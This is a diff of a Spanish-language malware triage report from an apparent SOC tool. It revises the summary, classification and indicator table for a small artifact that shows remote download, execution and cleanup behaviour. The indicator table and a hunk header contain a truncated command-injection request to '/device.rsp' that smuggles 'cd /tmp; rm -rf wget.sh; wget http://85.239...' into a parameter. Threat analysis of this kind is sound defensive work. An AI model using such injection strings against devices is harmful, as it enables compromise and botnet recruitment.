@@ -4,16 +4,16 @@
 
 ## 📌 Resumen
 
-Artefacto clasificado como **Payload** a partir de la evidencia disponible en Oráculo SOC. Comportamientos destacados: Descarga remota, Ejecución, Limpieza. Se asoció 1 comando observado o extraído.
+Artefacto de 451 B. Formato identificado como ASCII text, with CRLF line terminators. Entropía registrada: 5.74. No existe evidencia suficiente para atribuir este artefacto a una familia concreta. Comportamientos destacados: Descarga remota, Ejecución, Limpieza. Se identificó 1 comando observado o extraído. Se identificaron 4 indicadores técnicos.
+
 
 ## 🏷️ Clasificación
 
-- **Categoría:** `Payload`
 - **Riesgo:** `Medium`
 
 ## 🗓️ Registro
 
-- **Registrado:** `2026-08-09T21:03:20+00:00`
+- **Registrado:** `2026-08-09T21:03:20.000000Z`
 - **Tipo de registro:** `snapshot inmutable`
 
 ## 🔐 Identidad
@@ -51,10 +51,10 @@ POST /device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=cd+%2Ftmp%3B+rm
 
 | Tipo | Valor | Contexto |
 | --- | --- | --- |
-| ip | 143.0.0.XXX | static_analysis |
 | ip | 190.179.160.XXX | static_analysis |
-| hash | 08b0b1bbdee7fe1f736c1676f7f79e5681c4b623bc176b9c2b885ad353eb42ff | static_analysis |
+| ip | 143.0.0.XXX | static_analysis |
 | command | POST /device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=cd+%2Ftmp%3B+rm+-rf+wget.sh%3B+wget+http%3A%2F%2F85.239 | strings |
+| hash | 08b0b1bbdee7fe1f736c1676f7f79e5681c4b623bc176b9c2b885ad353eb42ff | static_analysis |
 | ip | 85.239.151.XXX | artifact_source |
 
 ## 🔎 Triage
